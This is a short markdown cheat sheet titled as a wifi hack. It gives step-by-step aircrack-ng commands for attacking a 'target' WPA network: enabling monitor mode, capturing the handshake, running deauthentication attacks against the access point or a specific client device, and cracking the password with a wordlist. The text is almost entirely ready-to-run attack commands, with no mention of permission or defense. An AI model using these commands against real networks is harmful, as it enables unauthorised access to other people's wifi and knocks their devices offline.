## Ubuntu Wifi Hack Aircrack-ng (vol. 1) 

### Before we start

- ```<wlan0>``` stands for your wifi adapter
- ```<wlan0mon>``` stands for your wifi adapter in monitor mode
- ```<bssid>``` stands for the target bssid
- ```<ch>``` stands for the target channel
- ```<filename>``` stands for the filename

### Let's dive in...

See the devices
- ```iwconfig```

Check for any conflicting processes and kill them.
- ```sudo airmon-ng check kill```

Set adapter monitor mode on.
- ```sudo airmon-ng start <wlan0>```

Monitor networks
- ```sudo airodump-ng <wlan0mon>``` | Get the *bssid* and *channel* info

Montior and wait for WPA handshake
- ```sudo airodump-ng -w <filename> -c <channel> --bssid <bssid> <wlan0mon>```

Deauth attack on another terminal
- ```sudo aireplay-ng --deauth 0 -a <bssid> <wlan0mon>``` | directly
- ```sudo aireplay-ng -0 2 -a <bssid> -c <stationaddr> <wlan0mon>``` | to a specific device

Crack the password
- ```sudo aircrack-ng WPAcrack-01.cap -w /pentest/passwords/wordlists/darkc0de```

### Exit

- ````sudo airmon-ng stop <wlan0mon> && service NetworkManager restart```
